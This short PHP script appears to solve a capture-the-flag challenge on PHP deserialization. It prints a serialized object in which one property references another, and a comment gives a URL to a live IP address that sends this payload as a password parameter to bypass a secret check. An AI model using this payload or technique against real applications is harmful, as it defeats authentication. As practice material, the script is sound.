<?php
	#phpÐòÁÐ»¯
class just4fun {
    var $enter;
    var $secret;
	function just4fun()
    {
        $this->enter=&$this->secret;
    }
}
$o = new just4fun();
echo serialize($o);
//O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
//http://115.28.150.176/php1/index.php?pass=O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
?>

